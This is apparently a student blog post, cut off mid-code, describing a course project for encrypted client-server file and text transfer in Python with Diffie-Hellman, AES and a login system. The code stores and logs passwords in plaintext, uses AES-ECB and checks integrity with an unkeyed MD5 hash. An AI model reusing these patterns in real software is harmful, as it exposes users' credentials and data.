缺乏了这个功能总感觉有点遗憾<br>2.登录和注册界面的功能也不是特别完善 再加上每次运行程序都需要重新输入ip地址和账号密码感觉不是特别方便 所以考虑优化一下这些东西<br>3.作为一个合格的协议 目前还缺少的一点就是数字签名部分 需要提供不可抵赖性 证明消息是由对应客户机发送的 而非被劫持后的<br>第二点的实现比较简单 稍微更改一下login.ui和ip_connect.ui和对应的类就可以了<br>要实现第一点的话 就要对目前的ui界面进行大改动了  而且还要给服务端增加处理与好友私聊以及群聊的功能  客户端这边也要处理好发送和接收 感觉是一个比较大的工程<br>总结下为了实现第一点需要去补充的功能<br>1.客户端新增好友功能  以登录时的username为账号 添加好友(或者干脆不做这个 实现起来没啥必要)后可以进行通讯<br>第一点的实现问题在于 如果客户端B离线 那么服务端那边就需要缓存A传输给B的数据 然后在B上线后发送给B<br>如果两者都在线的情况 如何处理好数据的转发也是一种难题 毕竟现在的代码就因为高频的send和recv的时候会因为网络延迟导致丢包 偷懒没有去写处理丢包的逻辑 而是人为控制客户端发包的速率来解决这个问题 本来速率就比较慢了 如果这个时候还需要把数据从服务端发送给客户端B 这个时间就比较久了  没办法实现实时通讯<br>按理来说 解决这一个方法也比较简单 大概可以从两个方面来实现<br>(1)加一个检测丢包的机制 如果发现丢包就重传<br>(2)经过测试 如果是一个体型较小的文件传输程序 是可以做到快速传输的 不需要手动添加发包延迟也可以 所以如果在传输大数据前新分配一个线程专门负责 会不会改善网络延迟、丢包的影响<br>2.服务端需要和数据库进行交互来记录不同用户之间的好友列表 还要写添加好友的功能<br>3.ui界面需要进行更新 这里依然是偷懒的选择抄袭qq的聊天界面 打算再原本左侧的选项栏的右边增加选择在哪个频道(群聊or私聊)发送消息<br>如果把上面提到的全部解决  这会是一个庞大的工程量 接下来优先解决丢包重传的问题<br>然后还有一点最关键的就是 如果想要实现一个基本的通讯软件的功能 即文件文本同时传输 例如表情包加文字的情况  那还需要优化服务端  需要把对于每一个数据包的data_type都进行校验</p><h3 id="优化数据包传输"><a href="#优化数据包传输" class="headerlink" title="优化数据包传输"></a>优化数据包传输</h3><p>这一点的优化原本是打算更改一下程序现有的逻辑<br>目前是 如果是无切片情况 那么就根据数据包中的data_byte来决定处理函数<br>如果是切片情况 先处理第一个切片的data_byte 然后选择处理函数<br>那么切片情况的处理就比较不理想了 如果攻击者伪造第一个包的data_type 就有可能导致服务端进入错误的处理函数 导致负责的进程陷入死机 所以理想情况应该是 服务端先接收所有的包 然后再根据每个包的data_type来分别处理<br>然后就是如果是单线程处理切片数据的话 会比较慢 往往传输完毕后过个几十秒才能把数据全部处理完<br>所以打算给处理数据的也加一个线程池 最多10个线程来同时处理<br>同时新增了重传机制 当服务端接收到了大小不满足一个切片长的数据包(除开最后一个数据包) 就会向客户端发送重传请求 客户端接收到后 就会从错误切片编号开始重新传输<br>客户端</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import socket</span><br><span class="line">import struct</span><br><span class="line">import hashlib</span><br><span class="line">import time</span><br><span class="line">import os</span><br><span class="line">from cryptography.hazmat.primitives import serialization</span><br><span class="line">from cryptography.hazmat.primitives.asymmetric import dh</span><br><span class="line">from cryptography.hazmat.backends import default_backend</span><br><span class="line">from Crypto.Util.Padding import pad, unpad</span><br><span class="line">from PySide6.QtWidgets import *</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line">from ip_connect import ipwindow</span><br><span class="line">from login import loginwindow</span><br><span class="line">from main import mainwindow</span><br><span class="line">from progressbar import barwindow</span><br><span class="line">from register import registerwindow</span><br><span class="line"></span><br><span class="line">class ipwindow(QMainWindow,ipwindow):</span><br><span class="line">    def __init__(self):</span><br><span class="line">        QMainWindow.__init__(self)</span><br><span class="line">        self.setupUi(self)</span><br><span class="line">        self.setWindowTitle(&quot;安全协议大作业-第六组&quot;)</span><br><span class="line">        with open(&quot;tempfile/ip.txt&quot;,&quot;r&quot;) as file:</span><br><span class="line">            ipaddr = file.read()</span><br><span class="line">            if len(ipaddr) != 0:</span><br><span class="line">                self.lineEdit.setText(ipaddr)</span><br><span class="line">                self.checkBox.setChecked(True)</span><br><span class="line">        l1 = self.lineEdit.returnPressed.connect(lambda:self.ip_connect())</span><br><span class="line">        b1 = self.pushButton.clicked.connect(lambda:self.ip_connect())</span><br><span class="line">        </span><br><span class="line">    def ip_connect(self):</span><br><span class="line">        if self.checkBox.isChecked():</span><br><span class="line">            with open(&quot;tempfile/ip.txt&quot;,&quot;w&quot;) as file:</span><br><span class="line">                ipaddr = self.lineEdit.text()</span><br><span class="line">                file.write(ipaddr)</span><br><span class="line">        else:</span><br><span class="line">            with open(&quot;tempfile/ip.txt&quot;,&quot;w&quot;) as file:</span><br><span class="line">                file.write(&quot;&quot;)</span><br><span class="line">        ipaddr = self.lineEdit.text()</span><br><span class="line">        key_switch(ipaddr,self)</span><br><span class="line">        </span><br><span class="line">class loginwindow(QMainWindow,loginwindow):</span><br><span class="line">    def __init__(self,s,shared_key):</span><br><span class="line">        QMainWindow.__init__(self)</span><br><span class="line">        self.setupUi(self)</span><br><span class="line">        self.setWindowTitle(&quot;安全协议大作业-第六组&quot;)</span><br><span class="line">        self.lineEdit_2.setEchoMode(QLineEdit.EchoMode.Password)</span><br><span class="line">        with open(&quot;tempfile/user.txt&quot;,&quot;r&quot;) as file:</span><br><span class="line">            user_info = file.read()</span><br><span class="line">            if len(user_info) != 0:</span><br><span class="line">                self.lineEdit.setText(user_info.split(&quot;;&quot;)[0])</span><br><span class="line">                self.lineEdit_2.setText(user_info.split(&quot;;&quot;)[1])</span><br><span class="line">                self.checkBox_2.setChecked(True)</span><br><span class="line">        b1 = self.pushButton.clicked.connect(lambda:self.login(s,shared_key))</span><br><span class="line">        b2 = self.pushButton_2.clicked.connect(lambda:self.return_ipconnect())</span><br><span class="line">        l1 = self.lineEdit.returnPressed.connect(lambda:self.move_focus(self.lineEdit_2))</span><br><span class="line">        l2 = self.lineEdit_2.returnPressed.connect(lambda:self.login(s,shared_key))</span><br><span class="line">        c1 = self.checkBox.stateChanged.connect(lambda:self.hide_password())</span><br><span class="line"></span><br><span class="line">    def hide_password(self):</span><br><span class="line">        if self.checkBox.isChecked():</span><br><span class="line">            self.lineEdit_2.setEchoMode(QLineEdit.EchoMode.Normal)</span><br><span class="line">        else:</span><br><span class="line">            self.lineEdit_2.setEchoMode(QLineEdit.EchoMode.Password)</span><br><span class="line"></span><br><span class="line">    def move_focus(self,lineEdit):</span><br><span class="line">        lineEdit.setFocus()</span><br><span class="line"></span><br><span class="line">    def return_ipconnect(self):</span><br><span class="line">        self.close()</span><br><span class="line">        ip_window = ipwindow()</span><br><span class="line">        ip_window.show()</span><br><span class="line"></span><br><span class="line">    def login(self,s,shared_key):</span><br><span class="line">        if self.checkBox_2.isChecked():</span><br><span class="line">            username = self.lineEdit.text()</span><br><span class="line">            password = self.lineEdit_2.text()</span><br><span class="line">            with open(&quot;tempfile/user.txt&quot;, &quot;w&quot;) as file:</span><br><span class="line">                file.write(username + &quot;;&quot; + password)</span><br><span class="line">        else:</span><br><span class="line">            with open(&quot;tempfile/user.txt&quot;,&#x27;w&#x27;) as file:</span><br><span class="line">                file.write(&quot;&quot;)</span><br><span class="line">        </span><br><span class="line">        username = self.lineEdit.text()</span><br><span class="line">        if len(username) == 0:</span><br><span class="line">            QMessageBox.information(None,&quot;报错信息&quot;,&quot;用户名不能为空&quot;,QMessageBox.StandardButton.Ok,QMessageBox.StandardButton.NoButton)</span><br><span class="line">        else:</span><br><span class="line">            password = self.lineEdit_2.text()</span><br><span class="line">            if len(password) == 0:</span><br><span class="line">                QMessageBox.information(None,&quot;报错信息&quot;,&quot;密码不能为空&quot;,QMessageBox.StandardButton.Ok,QMessageBox.StandardButton.NoButton)</span><br><span class="line">            else:</span><br><span class="line">                Authentication(s,shared_key,username,password,self)</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">class mainwindow(QMainWindow,mainwindow):</span><br><span class="line">    def __init__(self,s,shared_key):</span><br><span class="line">        QMainWindow.__init__(self)</span><br><span class="line">        self.setupUi(self)</span><br><span class="line">        self.setWindowTitle(&quot;安全协议大作业-第六组&quot;)</span><br><span class="line">        self.current_number = 1</span><br><span class="line">        self.pushButton.setStyleSheet(&quot;background-color: grey;&quot;)</span><br><span class="line">        self.textEdit.dropEvent = self.dropEvent</span><br><span class="line">        b1 = self.pushButton.clicked.connect(lambda:self.choose_mode(1,s,shared_key)) </span><br><span class="line">        b2 = self.pushButton_2.clicked.connect(lambda:self.choose_mode(2,s,shared_key))</span><br><span class="line">        b3 = self.pushButton_3.clicked.connect(lambda:self.choose_mode(3,s,shared_key))</span><br><span class="line">        b4 = self.pushButton_4.clicked.connect(lambda:self.return_ipconnect())</span><br><span class="line">        b5 = self.pushButton_5.clicked.connect(lambda:self.handle_send(s,shared_key))</span><br><span class="line">        b6 = self.pushButton_6.clicked.connect(lambda:self.clear_text())</span><br><span class="line">        b7 = self.pushButton_7.clicked.connect(lambda:self.edit_userprofile())</span><br><span class="line">        b9 = self.pushButton_9.clicked.connect(lambda:self.clear_log())</span><br><span class="line">        t1 = self.toolButton.clicked.connect(lambda:self.open_file())</span><br><span class="line">    </span><br><span class="line">    def edit_userprofile(self):</span><br><span class="line">        #尚未施工</span><br><span class="line">        exit()</span><br><span class="line">    def dropEvent(self,event):</span><br><span class="line">        files = event.mimeData().urls()</span><br><span class="line">        file_addr = files[0].toLocalFile()</span><br><span class="line">        if self.current_number == 1:</span><br><span class="line">            with open(file_addr,&#x27;r&#x27;) as file:</span><br><span class="line">                text = file.read()</span><br><span class="line">                self.textEdit.setText(text)</span><br><span class="line">        elif self.current_number == 2:</span><br><span class="line">            self.textEdit.setText(file_addr)</span><br><span class="line"></span><br><span class="line">    def open_file(self):</span><br><span class="line">        file_addr = QFileDialog.getOpenFileName(None,&quot;选择文件&quot;,&quot;F:\作业\python程序&quot;,&quot;所有文件(*);&quot;)</span><br><span class="line">        if self.current_number == 2:</span><br><span class="line">            self.textEdit.setText(file_addr[0])</span><br><span class="line">        else:</span><br><span class="line">            with open(file_addr[0],&#x27;r&#x27;) as file:</span><br><span class="line">                text = file.read()</span><br><span class="line">                self.textEdit.setText(text)</span><br><span class="line"></span><br><span class="line">    def clear_log(self):</span><br><span class="line">        self.textBrowser.clear()</span><br><span class="line"></span><br><span class="line">    def return_ipconnect(self):</span><br><span class="line">        self.close()</span><br><span class="line">        ip_window = ipwindow()</span><br><span class="line">        ip_window.show()</span><br><span class="line">    </span><br><span class="line">    def clear_text(self):</span><br><span class="line">        self.textEdit.clear()</span><br><span class="line"></span><br><span class="line">    def choose_mode(self,mode,s,shared_key):</span><br><span class="line">        self.current_number = mode</span><br><span class="line">        if mode == 1:</span><br><span class="line">            self.pushButton.setStyleSheet(&quot;background-color: grey;&quot;)</span><br><span class="line">            self.pushButton_2.setStyleSheet(u&quot;background-image: url(:/F:/\u4f5c\u4e1a/python\u7a0b\u5e8f/1.jpg);&quot;)</span><br><span class="line">            self.pushButton_3.setStyleSheet(u&quot;background-image: url(:/F:/\u4f5c\u4e1a/python\u7a0b\u5e8f/1.jpg);&quot;)</span><br><span class="line">        elif mode ==2:</span><br><span class="line">            self.pushButton_2.setStyleSheet(&quot;background-color: grey;&quot;)</span><br><span class="line">            self.pushButton_3.setStyleSheet(u&quot;background-image: url(:/F:/\u4f5c\u4e1a/python\u7a0b\u5e8f/1.jpg);&quot;)</span><br><span class="line">            self.pushButton.setStyleSheet(u&quot;background-image: url(:/F:/\u4f5c\u4e1a/python\u7a0b\u5e8f/1.jpg);&quot;)</span><br><span class="line">        elif mode ==3:</span><br><span class="line">            self.pushButton_3.setStyleSheet(&quot;background-color: grey;&quot;)</span><br><span class="line">            self.pushButton_2.setStyleSheet(u&quot;background-image: url(:/F:/\u4f5c\u4e1a/python\u7a0b\u5e8f/1.jpg);&quot;)</span><br><span class="line">            self.pushButton.setStyleSheet(u&quot;background-image: url(:/F:/\u4f5c\u4e1a/python\u7a0b\u5e8f/1.jpg);&quot;)</span><br><span class="line">            register(s,shared_key,self)</span><br><span class="line"></span><br><span class="line">    def handle_send(self,s,shared_key):</span><br><span class="line">        if self.current_number == 1:</span><br><span class="line">            transfer_txt(s,shared_key,self)</span><br><span class="line">        elif self.current_number == 2:</span><br><span class="line">            transfer_file(s,shared_key,self)</span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">class barwindow(QMainWindow,barwindow):</span><br><span class="line">    def __init__(self,text,sliced_sum,transfer_data,s,main_window,full_name):</span><br><span class="line">        QMainWindow.__init__(self)</span><br><span class="line">        self.setupUi(self)</span><br><span class="line">        self.progressBar.setValue(0)</span><br><span class="line">        self.setWindowTitle(&quot;安全协议大作业-第六组&quot;)</span><br><span class="line">        l1 = self.label.setText(text)</span><br><span class="line">        b1 = self.pushButton_2.clicked.connect(lambda:self.start_transfer(sliced_sum,transfer_data,s,main_window,full_name))</span><br><span class="line">        b2 = self.pushButton.clicked.connect(lambda:self.end_transfer(s))</span><br><span class="line">    </span><br><span class="line">    def start_transfer(self,sliced_sum,transfer_data,s,main_window,full_name):</span><br><span class="line">        a_time = time.time()</span><br><span class="line">        for i in range(sliced_sum):</span><br><span class="line">            s.sendall(transfer_data[i])</span><br><span class="line">            self.progressBar.setValue((i/(sliced_sum-1))*100)</span><br><span class="line">            QApplication.processEvents()</span><br><span class="line">        </span><br><span class="line">        count = 0</span><br><span class="line">        while 1:   #设置最大连接时间为2s  用来接收服务端的重传请求 如果数据无误则过2s提示传输成功</span><br><span class="line">            try:</span><br><span class="line">                s.settimeout(2.0)</span><br><span class="line">                text = s.recv(1024).decode()</span><br><span class="line">                if &quot;重传&quot; in text:</span><br><span class="line">                    self.progressBar.setValue(0)</span><br><span class="line">                    count += 1</span><br><span class="line">                    information = f&quot;传输出现丢包 需要进行重传\n当前重传次数:&#123;count&#125;&quot;</span><br><span class="line">                    self.label.setText(information)</span><br><span class="line">                    start = text.find(&quot;[&quot;)+1</span><br><span class="line">                    end = text.find(&quot;]&quot;)</span><br><span class="line">                    number = text[start:end]</span><br><span class="line">                    number = int(number,10)</span><br><span class="line">                    for i in range(number-1,sliced_sum):</span><br><span class="line">                        s.sendall(transfer_data[i])</span><br><span class="line">                        self.progressBar.setValue((i/(sliced_sum-1))*100)</span><br><span class="line">                        QApplication.processEvents()</span><br><span class="line">            except socket.timeout:</span><br><span class="line">                break  </span><br><span class="line">            finally:</span><br><span class="line">                s.settimeout(None)</span><br><span class="line">        </span><br><span class="line">        b_time = time.time()</span><br><span class="line">        self.pushButton_2.setText(&quot;再次发送&quot;)</span><br><span class="line">        QMessageBox.information(None,&quot;输出信息&quot;,f&quot;文件发送成功\n耗时&#123;b_time-a_time:.2f&#125;s&quot;,QMessageBox.StandardButton.Ok,QMessageBox.StandardButton.NoButton)</span><br><span class="line">        main_window.textBrowser.append(f&quot;&#123;full_name&#125;传输成功&quot;)</span><br><span class="line">    def end_transfer(self,s):</span><br><span class="line">        s.send(b&quot;&quot;)</span><br><span class="line">        self.close()</span><br><span class="line"></span><br><span class="line">class registerwindow(QMainWindow,registerwindow):</span><br><span class="line">    def __init__(self,s,shared_key,main_window):</span><br><span class="line">        QMainWindow.__init__(self)</span><br><span class="line">        self.setupUi(self)</span><br><span class="line">        self.setWindowTitle(&quot;安全协议大作业-第六组&quot;)</span><br><span class="line">        b1 = self.pushButton.clicked.connect(lambda:self.register(s,shared_key,main_window))</span><br><span class="line">        b2 = self.pushButton_2.clicked.connect(lambda:self.return_mainwindow())</span><br><span class="line">    </span><br><span class="line">    def register(self,s,shared_key,main_window):</span><br><span class="line">        username = self.lineEdit.text()</span><br><span class="line">        password = self.lineEdit_2.text()</span><br><span class="line">        if len(username) == 0:</span><br><span class="line">            QMessageBox.information(None,&quot;报错信息&quot;,&quot;用户名不能为空&quot;,QMessageBox.StandardButton.Ok,QMessageBox.StandardButton.NoButton)</span><br><span class="line">            return</span><br><span class="line">        else:</span><br><span class="line">            password = self.lineEdit_2.text()</span><br><span class="line">            if len(password) == 0:</span><br><span class="line">                QMessageBox.information(None,&quot;报错信息&quot;,&quot;密码不能为空&quot;,QMessageBox.StandardButton.Ok,QMessageBox.StandardButton.NoButton)</span><br><span class="line">                return</span><br><span class="line">            data = username+&quot;;&quot;+password</span><br><span class="line">            transfer_data = pack_data(3,data,shared_key,0,0)</span><br><span class="line">            s.send(transfer_data)</span><br><span class="line">            text = s.recv(1024).decode()</span><br><span class="line">            if &quot;成功&quot; in text:</span><br><span class="line">                QMessageBox.information(None,&quot;输出信息&quot;,&quot;用户注册成功&quot;,QMessageBox.StandardButton.Ok,QMessageBox.StandardButton.NoButton)</span><br><span class="line">            elif &quot;存在&quot; in text:</span><br><span class="line">                QMessageBox.information(None,&quot;报错信息&quot;,&quot;用户已存在&quot;,QMessageBox.StandardButton.Ok,QMessageBox.StandardButton.NoButton)</span><br><span class="line">            else:</span><br><span class="line">                QMessageBox.information(None,&quot;报错信息&quot;,text,QMessageBox.StandardButton.Ok,QMessageBox.StandardButton.NoButton)</span><br><span class="line">    def return_mainwindow(self):</span><br><span class="line">        self.close()</span><br><span class="line"></span><br><span class="line">def md5_encrypt(data):  #md5加密 用于完整性检测 </span><br><span class="line">    md5_hash = hashlib.md5()</span><br><span class="line">    if isinstance(data,str):</span><br><span class="line">        data = data.encode()</span><br><span class="line">    md5_hash.update(data)</span><br><span class="line">    hash_result = md5_hash.hexdigest()</span><br><span class="line">    return hash_result</span><br><span class="line"></span><br><span class="line">def pack_data(choice,data,shared_key,sliced,sum):  #将数据打包成报文 格式:  sliced_judge(4bytes)+data_length(4bytes)+data_type(4bytes)+encrypted_data(Dynamic)+md5_data(32bytes)</span><br><span class="line">    sliced_sum = struct.pack(&#x27;&gt;H&#x27;,sum)</span><br><span class="line">    sliced_num = struct.pack(&#x27;&gt;H&#x27;,sliced)</span><br><span class="line">    choice_type = struct.pack(&#x27;&gt;I&#x27;,choice)</span><br><span class="line">    en_data = encrypt_data(shared_key,data)</span><br><span class="line">    hash_data = md5_encrypt(data).encode()</span><br><span class="line">    temp = choice_type+en_data+hash_data</span><br><span class="line">    transfer_data = sliced_sum+sliced_num+struct.pack(&#x27;&gt;I&#x27;,len(temp)+8)+temp </span><br><span class="line">    return transfer_data</span><br><span class="line"></span><br><span class="line">def key_switch(ipaddr,ip_window):   #交换公钥</span><br><span class="line">    # 固定的 DH 参数</span><br><span class="line">    p = 167369435262828772525424092470263277532300828423668354542113388987940885403967569624276882159444702063514952468172684099658558089467275283830276841486674376457626767287709752368374119769545320657500942952067517443133715688577345716588234520369470508343544601072272539124731608794518466242096737284389743744833</span><br><span class="line">    g = 2</span><br><span class="line">    parameters = dh.DHParameterNumbers(p, g).parameters(backend=default_backend())</span><br><span class="line">    </span><br><span class="line">    private_key_client = parameters.generate_private_key()</span><br><span class="line">    public_key_client = private_key_client.public_key()</span><br><span class="line">    </span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    </span><br><span class="line">    try:</span><br><span class="line">        s.connect((ipaddr,6666))</span><br><span class="line">    except Exception as e:</span><br><span class="line">        QMessageBox.information(None,&quot;报错信息&quot;,str(e),QMessageBox.StandardButton.Ok,QMessageBox.StandardButton.NoButton)</span><br><span class="line">    public_key_bytes = public_key_client.public_bytes(   </span><br><span class="line">    encoding=serialization.Encoding.PEM,</span><br><span class="line">    format=serialization.PublicFormat.SubjectPublicKeyInfo</span><br><span class="line">)</span><br><span class="line">    s.send(public_key_bytes)</span><br><span class="line">    public_key_server = s.recv(1024)</span><br><span class="line">    public_key_server = serialization.load_pem_public_key(public_key_server)</span><br><span class="line">    shared_key = private_key_client.exchange(public_key_server)</span><br><span class="line">    login_window = loginwindow(s,shared_key)</span><br><span class="line">    ip_window.close()</span><br><span class="line">    login_window.show()</span><br><span class="line"></span><br><span class="line">def encrypt_data(shared_key,data):  #aes加密</span><br><span class="line">    key = shared_key[:16]  </span><br><span class="line">    aes = AES.new(key,AES.MODE_ECB)</span><br><span class="line">    if isinstance(data,str):</span><br><span class="line">        data = data.encode()</span><br><span class="line">    data_bytes = pad(data, AES.block_size)</span><br><span class="line">    encrypt_data = aes.encrypt(data_bytes)</span><br><span class="line">    return encrypt_data</span><br><span class="line"></span><br><span class="line">def Authentication(s,shared_key,username,password,login_window):</span><br><span class="line">    data = username+&quot;;&quot;+password</span><br><span class="line">    transfer_data = encrypt_data(shared_key,data)  #使用aes加密账号密码</span><br><span class="line">    s.send(transfer_data)</span><br><span class="line">    text = (s.recv(1024)).decode()</span><br><span class="line">    </span><br><span class="line">    if text == &quot;你输入的用户名不存在 终止本次连接&quot;:</span><br><span class="line">        QMessageBox.information(None,&quot;报错信息&quot;,text,QMessageBox.StandardButton.Ok,QMessageBox.StandardButton.NoButton)</span><br><span class="line">        s.close()</span><br><span class="line">        exit()</span><br><span class="line">    elif text == &quot;密码错误，终止连接&quot;:</span><br><span class="line">        QMessageBox.information(None,&quot;报错信息&quot;,text,QMessageBox.StandardButton.Ok,QMessageBox.StandardButton.NoButton)</span><br><span class="line">        s.close()</span><br><span class="line">        exit()</span><br><span class="line">    else:</span><br><span class="line">        main_window = mainwindow(s,shared_key)</span><br><span class="line">        login_window.close()</span><br><span class="line">        main_window.show()</span><br><span class="line">        </span><br><span class="line">def register(s,shared_key,main_window):</span><br><span class="line">    register_window = registerwindow(s,shared_key,main_window)</span><br><span class="line">    register_window.show()</span><br><span class="line"></span><br><span class="line">def transfer_txt(s,shared_key,main_window):</span><br><span class="line">    text = main_window.textEdit.toPlainText()</span><br><span class="line">    if len(text) &gt; 1024:</span><br><span class="line">        sliced = 0</span><br><span class="line">        chunk_size = 1024</span><br><span class="line">        sliced_data = slice_string(text, chunk_size)</span><br><span class="line">        sliced_sum = len(sliced_data)</span><br><span class="line">        for i in range(len(sliced_data)):</span><br><span class="line">            transfer_data = pack_data(1,sliced_data[i],shared_key,sliced,sliced_sum)</span><br><span class="line">            sliced += 1</span><br><span class="line">            s.send(transfer_data)</span><br><span class="line">    else :</span><br><span class="line">        sliced = 1</span><br><span class="line">        sliced_sum = 1</span><br><span class="line">        transfer_data = pack_data(1,text,shared_key,sliced,sliced_sum)</span><br><span class="line">        s.send(transfer_data)</span><br><span class="line">    main_window.textBrowser.append(&quot;文本数据传输成功&quot;)</span><br><span class="line"></span><br><span class="line">def slice_string(data, chunk_size):</span><br><span class="line">    #根据指定大小切片字符串</span><br><span class="line">    return [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)]</span><br><span class="line"></span><br><span class="line">def transfer_file(s,shared_key,main_window):</span><br><span class="line">    file_addr = main_window.textEdit.toPlainText()</span><br><span class="line">    file_addr = file_addr.replace(&quot;file:///&quot;,&quot;&quot;)</span><br><span class="line">    with open(file_addr,&#x27;rb&#x27;) as file:</span><br><span class="line">        text = file.read()</span><br><span class="line">    </span><br><span class="line">    file_name, file_extension = os.path.splitext(os.path.basename(file_addr))</span><br><span class="line">    full_name = file_name+file_extension</span><br><span class="line">    transfer_data = []</span><br><span class="line">    </span><br><span class="line">    if len(text) &gt; 1024:</span><br><span class="line">        sliced = 0</span><br><span class="line">        chunk_size = 1024</span><br><span class="line">        sliced_data = slice_string(text, chunk_size)</span><br><span class="line">        sliced_sum = len(sliced_data)</span><br><span class="line">        for i in range(len(sliced_data)):</span><br><span class="line">            sliced += 1</span><br><span class="line">            transfer_data.append(pack_data(2,sliced_data[i],shared_key,sliced,sliced_sum))</span><br><span class="line">        text = f&quot;需要传输&#123;sliced_sum&#125;组数据&quot;</span><br><span class="line">        bar_window = barwindow(text,sliced_sum,transfer_data,s,main_window,full_name)</span><br><span class="line">        bar_window.show()</span><br><span class="line">    else:</span><br><span class="line">        sliced = 1</span><br><span class="line">        sliced_sum = 1</span><br><span class="line">        transfer_data = pack_data(2,text,shared_key,sliced,sliced_sum)</span><br><span class="line">        text = f&quot;需要传输&#123;sliced_sum&#125;组数据&quot;</span><br><span class="line">        bar_window = barwindow(text,sliced_sum,transfer_data,s,main_window,full_name)</span><br><span class="line">        bar_window.show()</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    app = QApplication()</span><br><span class="line">    ip_window = ipwindow()</span><br><span class="line">    ip_window.show()</span><br><span class="line">    app.exec()</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>服务端</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import socket</span><br><span class="line">import hashlib</span><br><span class="line">import magic</span><br><span class="line">import time</span><br><span class="line">from cryptography.hazmat.primitives import serialization</span><br><span class="line">from cryptography.hazmat.primitives.asymmetric import dh</span><br><span class="line">from cryptography.hazmat.backends import default_backend</span><br><span class="line">from Crypto.Util.Padding import pad, unpad</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">import sqlite3</span><br><span class="line">from concurrent.futures import ThreadPoolExecutor</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">mime = magic.Magic(mime=True)</span><br><span class="line"></span><br><span class="line">def write_log(log_file,text):</span><br><span class="line">    current_time = time.asctime(time.localtime(time.time()))</span><br><span class="line">    text += &quot;   &quot;+current_time</span><br><span class="line">    log_file.write(text.encode()+b&quot;\n&quot;)</span><br><span class="line"></span><br><span class="line">class query_thread(threading.Thread):</span><br><span class="line">    </span><br><span class="line">    def __init__(self,name = None):</span><br><span class="line">        threading.Thread.__init__(self,name=name)</span><br><span class="line"></span><br><span class="line">    def query_username(self,username):</span><br><span class="line">        conn = sqlite3.connect(&#x27;users.db&#x27;)</span><br><span class="line">        cursor = conn.cursor()</span><br><span class="line">        cursor.execute(&quot;SELECT username FROM users WHERE username = ?&quot;, (username,))</span><br><span class="line">        result = cursor.fetchone()</span><br><span class="line">        cursor.close()</span><br><span class="line">        return result</span><br><span class="line"></span><br><span class="line">    def query_password(self,username,password):</span><br><span class="line">        conn = sqlite3.connect(&#x27;users.db&#x27;)</span><br><span class="line">        cursor = conn.cursor()</span><br><span class="line">        cursor.execute(&quot;SELECT password FROM users WHERE username = ? AND password = ?&quot;, (username, password))</span><br><span class="line">        result = cursor.fetchone()</span><br><span class="line">        cursor.close()</span><br><span class="line">        return result</span><br><span class="line"></span><br><span class="line">    def add_user(self,sock,username,password,addr,login_username,log_file):</span><br><span class="line">        conn = sqlite3.connect(&#x27;users.db&#x27;)</span><br><span class="line">        cursor = conn.cursor()</span><br><span class="line">        try:</span><br><span class="line">            # 插入新的用户数据</span><br><span class="line">            cursor.execute(&quot;INSERT INTO users (username, password) VALUES (?, ?)&quot;, (str(username), str(password)))</span><br><span class="line">            conn.commit()</span><br><span class="line">        except sqlite3.IntegrityError:</span><br><span class="line">            sock.send(&quot;用户已存在&quot;.encode())</span><br><span class="line">            print(f&quot;&#123;threading.current_thread().name&#125;:用户&#123;username&#125;已存在,注册失败&quot;)</span><br><span class="line">            text = f&quot;客户机&#123;addr&#125;使用管理员权限用户(&#123;login_username&#125;)注册新用户(&#123;username&#125;)失败 因为用户已存在&quot;</span><br><span class="line">            write_log(log_file,text)</span><br><span class="line">        except Exception as e:</span><br><span class="line">            sock.send(e.encode())</span><br><span class="line">        sock.send(&quot;用户注册成功&quot;.encode())</span><br><span class="line">        print(f&quot;&#123;threading.current_thread().name&#125;:用户&#123;username&#125;注册成功&quot;)</span><br><span class="line">        text = f&quot;客户机&#123;addr&#125;使用管理员权限用户(&#123;login_username&#125;)注册新用户(&#123;username&#125;)成功 对应用户密码为(&#123;password&#125;)&quot;</span><br><span class="line">        write_log(log_file,text)</span><br><span class="line"></span><br><span class="line">def md5_encrypt(data):</span><br><span class="line">    if isinstance(data, str): </span><br><span class="line">        data = data.encode()  # md5加密需要bytes参数</span><br><span class="line">    md5_hash = hashlib.md5()  #md5加密</span><br><span class="line">    md5_hash.update(data)</span><br><span class="line">    hash_result = md5_hash.hexdigest()</span><br><span class="line">    </span><br><span class="line">    return hash_result</span><br><span class="line"></span><br><span class="line">def key_switch(sock,public_key_server):</span><br><span class="line">    print(f&quot;&#123;threading.current_thread().name&#125;开始进行公钥交换&quot;)</span><br><span class="line">    try:</span><br><span class="line">        public_key_client = sock.recv(1024)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(&quot;接受错误&quot;,e)</span><br><span class="line">    </span><br><span class="line">    public_key_bytes = public_key_server.public_bytes(    #将客户端的公钥序列化为 PEM 格式的字节串</span><br><span class="line">    encoding=serialization.Encoding.PEM,  </span><br><span class="line">    format=serialization.PublicFormat.SubjectPublicKeyInfo</span><br><span class="line">)</span><br><span class="line">    sock.send(public_key_bytes)</span><br><span class="line">    return serialization.load_pem_public_key(public_key_client) #将接受到的服务端公钥反序列化为公钥对象</span><br><span class="line"></span><br><span class="line">def decrypt_data(shared_key,data):   #data要为byte型</span><br><span class="line">    key = shared_key[:16]</span><br><span class="line">    aes = AES.new(key,AES.MODE_ECB)</span><br><span class="line">    if isinstance(data,str):</span><br><span class="line">        data = data.encode()</span><br><span class="line">    decrypted_data = aes.decrypt(data)</span><br><span class="line">    data = (unpad(decrypted_data, 16))</span><br><span class="line">    return data</span><br><span class="line"></span><br><span class="line">def unpack_data(shared_key,orign_data):     #拆解数据包</span><br><span class="line">    sliced_sum = int.from_bytes(orign_data[:2],byteorder = &#x27;big&#x27;)</span><br><span class="line">    sliced_num = int.from_bytes(orign_data[2:4],byteorder=&#x27;big&#x27;)</span><br><span class="line">    data_length = int.from_bytes(orign_data[4:8], byteorder=&#x27;big&#x27;)</span><br><span class="line">    data_type = int.from_bytes(orign_data[8:12], byteorder=&#x27;big&#x27;)</span><br><span class="line">    